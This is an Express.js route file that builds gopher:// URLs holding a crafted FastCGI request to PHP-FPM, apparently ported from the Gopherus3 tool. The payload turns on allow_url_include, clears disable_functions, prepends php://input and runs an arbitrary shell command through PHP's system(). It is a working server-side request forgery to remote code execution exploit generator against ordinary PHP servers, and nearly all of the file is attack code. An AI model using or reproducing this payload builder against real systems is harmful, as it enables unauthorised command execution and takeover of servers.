const express = require('express');
const router = express.Router();
const { body } = require('express-validator');

//Reference: https://github.com/Esonhugh/Gopherus3/blob/main/gopherus3/module/FastCGI.py
router.post('/fastcgi', validate([
    body('host').optional(),
    body('port').optional().isNumeric().withMessage('Port must be a number')
        .isInt({ min: 1, max: 65535 }).withMessage('Port must be between 1 and 65535'),
    body('filename').optional().isString().notEmpty()
        .withMessage('Filename must be a non-empty string'),
    body('command').optional().isString().notEmpty()
        .withMessage('Command must be a non-empty string')
]), async (req, res, next) => {
    try {
        const host = req.body.host || '127.0.0.1';
        const port = req.body.port || 9000;
        const filename = req.body.filename || '/usr/share/php/PEAR.php';
        const command = req.body.command || 'whoami';

        const length = Buffer.byteLength(command) + 19;
        const char   = String.fromCharCode(length);

        const data = "\x0f\x10SERVER_SOFTWAREgo / fcgiclient \x0b\t" +
            "REMOTE_ADDR127.0.0.1\x0f\x08" +
            "SERVER_PROTOCOLHTTP/1.1\x0e" +
            String.fromCharCode(Buffer.byteLength(length.toString())) +
            "CONTENT_LENGTH" + length +
            "\x0e\x04REQUEST_METHODPOST\tKPHP_VALUEallow_url_include = On\n" +
            "disable_functions = \nauto_prepend_file = php://input\x0f" +
            String.fromCharCode(Buffer.byteLength(filename)) +
            "SCRIPT_FILENAME" + filename + "\r\x01DOCUMENT_ROOT/";

        const temp1 = String.fromCharCode(data.length >> 8);
        const temp2 = String.fromCharCode(data.length & 0xFF);
        const temp3 = String.fromCharCode(data.length % 8);

        const end = "\x00".repeat(data.length % 8) +
            "\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00" + char + "\x04\x00" +
            "<?php system('" + command + "');?>\x00\x00\x00\x00";

        const start = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01"
                + temp1 + temp2 + temp3 + "\x00";

        const payload = start + data + end;

        const encodedPayload = encodeURIComponent(payload).replace(/'/g, '%27').replace(/\(/g, '%28')
            .replace(/\)/g, '%29').replace(/\+/g, '%20').replace(/\//g, '%2F');

        const generated = `gopher://${host}:${port}/_${encodedPayload}`;

        res.send(generated);
    } catch (error) {
        next(error);
    }
});

module.exports = router;
